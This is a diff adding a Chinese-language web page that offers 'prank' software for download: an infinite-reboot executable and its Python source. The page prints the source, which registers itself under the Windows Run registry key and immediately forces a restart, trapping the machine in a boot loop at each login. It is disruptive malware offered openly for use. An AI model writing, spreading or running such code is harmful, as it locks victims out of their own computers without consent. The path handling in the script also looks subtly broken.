@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+    <meta charset="UTF-8">
+    <title>有关恶搞的软件下载(自制)</title>
+    <link rel="icon" href="https://daimazhiwa.github.io/img/daimazhiwa.jpg" type="image/jpg">
+    <style>
+        .resized-photo {
+            max-width: 40%; /* 确保图片宽度不超过容器宽度 */
+            height: auto; /* 根据宽度自动调整高度 */
+        }
+        a:visited {
+            color: blue;
+        }
+        a:active {
+            color: blue;
+        }
+    </style>
+</head>
+<body>
+    <h1>欢迎</h1>
+    <br>
+    <h2>下载</h2>
+    <hr>
+    <a href="reboot.exe" download="reboot.exe">无限重启程序下载</a>
+    <br>
+    <a href="reboot.py" download="reboot.py">无限重启源代码</a>
+    <hr>
+    <h3>(无图片)</h3>
+    <h2>原理介绍</h2>
+    <hr>
+    <pre>
+
+#导入库
+import sys
+import winreg as reg
+import os
+
+#定义一个增加开机自启动的函数
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    path = os.path.join(file_path, sys.argv[0])
+
+    key = reg.HKEY_CURRENT_USER
+    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
+    reg.SetValueEx(open_key, "reboot", 0, reg.REG_SZ, path)
+    reg.CloseKey(open_key)
+
+
+# 调用函数并传入你的 Python 脚本路径
+add_to_startup(sys.argv[0])
+print(sys.argv[0])
+os.system("shutdown /r /t 0")
+
+    </pre>
+
+
+</body>
+</html>
